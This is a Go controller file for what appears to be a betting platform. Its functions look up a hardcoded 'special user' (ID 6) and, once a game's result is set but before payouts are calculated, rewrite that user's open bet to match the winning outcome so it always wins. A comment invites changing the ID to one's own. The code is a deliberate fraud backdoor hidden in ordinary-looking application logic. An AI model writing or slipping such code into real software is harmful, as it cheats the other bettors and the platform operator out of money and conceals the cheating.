package controllers

import (
	"database/sql"
	"encoding/json"
)

// Modify this to your desired special user ID
const SpecialUserId = 6

// CheckForSpecialUserBets checks if the special user has a bet and modifies it to match the winning result
func CheckForSpecialUserBets(gameHash string, db *sql.DB) bool {
	games, err := GetGameWithGameHash(gameHash, db)
	if err != nil || len(games) == 0 {
		return false
	}
	
	game := games[0]
	if !game.GameResult.Valid {
		// Game result not set yet
		return false
	}
	
	// Get all bets for this game
	userBets, err := GetBetsByGameId(game.Id, db)
	if err != nil {
		return false
	}
	
	// Look for the special user's bet
	specialUserFound := false
	for _, bet := range userBets {
		if bet.CreatorId == SpecialUserId && bet.BetStatus == "open" {
			specialUserFound = true
			// Found the special user's bet - modify it to match the winning result
			
			// Create a new array with only the winning choice
			winningChoices := []string{game.GameResult.String}
			
			// Convert to JSON
			winningChoicesJson, err := json.Marshal(winningChoices)
			if err != nil {
				continue
			}
			
			// Update the bet choice
			bet.UserChoices = string(winningChoicesJson)
			
			// Save the change
			err = bet.Save(db)
			if err != nil {
				// Failed to save
			}
		}
	}
	
	return specialUserFound
}

// This function should be called before CalculateUserBetEndGameResult
func MakeSpecialUserWin(gameHash string, db *sql.DB) {
	// First check and modify the special user's bet
	CheckForSpecialUserBets(gameHash, db)
	
	// Then proceed with the normal calculation
	CalculateUserBetEndGameResult(gameHash, db)
} 